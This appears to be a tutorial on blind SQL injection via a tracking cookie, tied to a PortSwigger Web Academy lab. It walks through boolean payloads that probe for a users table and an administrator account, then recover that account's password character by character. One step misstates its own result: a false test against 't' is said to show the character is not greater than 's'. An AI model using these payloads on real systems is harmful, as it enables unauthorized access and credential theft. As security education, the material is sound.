Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:
```txt
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```
Which the application process and uses a SQL query to determine whether this is a known user:
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```
While this query is vulnerable to SQL Injection, the results are not returned to the user. However, the application does behave differently depending on whether the query returns any data. For example, submitting a recognized `TrackingId` will return a "Welcome back" message in the response.

This type of behavior is enough to be able to exploit blind SQL injection. You can retrieve information by triggering different responses depending on an injected condition.

Using the example above, suppose that the two following requests are sent in turn:
```txt
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND '1'='1
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND '1'='2
```
- The first of these values causes the query to return results, because the injected `AND '1'='1` condition is true. As a result, the "Welcome back" message is displayed.
- The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.
## Example Exploit
Another example, suppose you want to find out if the `users` table does exists and if there is a user account called `Administrator`.
1. You can do this by sending the following input:
```txt
...xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```
Verify that the condition is true, confirming that there is a table called `users`.

2. Now we can change the payload to:
```txt
...xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```
Verify that the condition is true, confirming that there is a user called `administrator`.
## Example Exploit Continuation
You can also use this technique to find out the password of the user called `administrator` by sending a series of inputs to test the password length:
```txt
...xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
```
When the condition stops being true (i.e when the "Welcome back" message disappears), we have determined the length of the password.

1. We can now then do use the same technique to find out the password one character at a time:
```txt
...xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```
Verify that the condition is true, confirming that the first password character is greater than `m`.

2. Next send the following input:
```txt
...xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```
Verify that the condition is not true, confirming that the first password character is not greater than `s`.

3. Eventually, the following input returns a "Welcome back" message, thereby confirming that the first character is `s`:
```txt
...xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```
## Example from PortSwigger Web Academy
The video below uses the Cluster Bomb attack type
![SQL Injection - Lab #11 Blind SQL injection with conditional responses(https://img.youtube.com/vi/LBG_n9fr8sM/0.jpg)](https://www.youtube.com/watch?v=LBG_n9fr8sM)
The video below uses the Sniper attack type and manual brute forcing
![Blind SQL injection with conditional responses (Video solution, Audio)(https://img.youtube.com/vi/M5Ko7F1_co4/0.jpg) ](https://www.youtube.com/watch?v=M5Ko7F1_co4)